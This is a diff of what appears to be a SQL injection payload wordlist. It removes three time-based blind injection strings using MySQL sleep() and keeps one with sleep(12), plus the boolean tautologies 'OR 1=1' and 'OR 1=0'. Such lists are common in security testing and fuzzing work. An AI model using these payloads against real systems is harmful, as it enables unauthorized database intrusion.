@@ -1,6 +1,3 @@
-0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
-0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
-0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z
  OR 1=1
  OR 1=0
